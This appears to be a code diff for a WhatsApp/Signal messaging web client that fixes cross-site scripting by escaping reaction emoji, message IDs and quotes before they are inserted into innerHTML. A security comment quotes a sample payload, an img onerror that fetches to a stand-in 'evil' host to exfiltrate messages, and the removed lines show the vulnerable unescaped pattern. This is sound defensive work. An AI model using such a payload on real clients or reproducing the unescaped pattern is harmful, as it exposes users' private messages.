@@ -6219,9 +6219,17 @@ body::after {
   }
 
   function escapeHtml(str) {
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
+    // Escape all HTML-significant characters including quotes.
+    // The browser-default div.textContent/div.innerHTML escapes <, >, &, but
+    // NOT ' or ", which breaks attribute-value and JS-string-literal contexts
+    // (onclick="foo('${untrusted}')"). Escape quotes explicitly so the same
+    // helper is safe for every context we use it in.
+    return String(str == null ? '' : str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
   }
 
   function trimTrailingURLPunctuation(rawURL) {
@@ -6904,13 +6912,25 @@ body::after {
         }
 
         // Reactions
+        //
+        // SECURITY: r.emoji is attacker-controlled. WhatsApp and Signal both
+        // accept arbitrary strings as reaction "text" at the protocol level —
+        // whatsmeow's reaction.GetText() and signal-cli's reaction.Emoji are
+        // raw bytes, not validated graphemes. A crafted reaction like
+        //   <img src=x onerror="fetch('https://evil/'+btoa(...))">
+        // rendered via innerHTML without escaping would fire on paint and
+        // exfiltrate the entire local message store (same-origin access to
+        // /api/messages). Always escape.
         if (m.Reactions) {
           try {
             const reactions = JSON.parse(m.Reactions);
             if (reactions.length > 0) {
               html += '<div class="msg-reactions">';
               reactions.forEach(r => {
-                html += `<span class="reaction-pill" title="${r.count} reaction${r.count > 1 ? 's' : ''}">${r.emoji}<span class="reaction-count">${r.count > 1 ? r.count : ''}</span></span>`;
+                const count = Number(r.count) || 0;
+                const emoji = escapeHtml(r.emoji || '');
+                const countLabel = escapeHtml(`${count} reaction${count > 1 ? 's' : ''}`);
+                html += `<span class="reaction-pill" title="${countLabel}">${emoji}<span class="reaction-count">${count > 1 ? count : ''}</span></span>`;
               });
               html += '</div>';
             }
@@ -6925,16 +6945,21 @@ body::after {
         html += `<button class="action-reply" title="Reply"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 17 4 12 9 7"/><path d="M20 18v-2a4 4 0 0 0-4-4H4"/></svg></button>`;
         html += `</div>`;
 
-        // Emoji picker (hidden, toggled by react button)
-        html += `<div class="emoji-picker" id="emoji-${m.MessageID}">`;
+        // Emoji picker (hidden, toggled by react button). MessageID is
+        // server-assigned (e.g. "whatsapp:<stanzaID>") but still goes through
+        // escapeHtml defensively since it's interpolated into both attribute
+        // values and onclick JS string literals.
+        const safeMsgId = escapeHtml(m.MessageID);
+        html += `<div class="emoji-picker" id="emoji-${safeMsgId}">`;
         QUICK_EMOJIS.forEach(e => {
-          html += `<button onclick="sendReaction('${m.MessageID}','${e}')">${e}</button>`;
+          const safeEmoji = escapeHtml(e);
+          html += `<button onclick="sendReaction('${safeMsgId}','${safeEmoji}')">${safeEmoji}</button>`;
         });
-        html += `<button class="emoji-plus" data-msg-id="${m.MessageID}" onclick="toggleFullEmojiPanel(event, '${m.MessageID}')">+</button>`;
+        html += `<button class="emoji-plus" data-msg-id="${safeMsgId}" onclick="toggleFullEmojiPanel(event, '${safeMsgId}')">+</button>`;
         html += '</div>';
 
         // Full emoji panel is hydrated on demand instead of for every message upfront.
-        html += `<div class="emoji-full-panel" id="emoji-full-${m.MessageID}"></div>`;
+        html += `<div class="emoji-full-panel" id="emoji-full-${safeMsgId}"></div>`;
 
         el.innerHTML = html;
         el.dataset.msgId = m.MessageID;
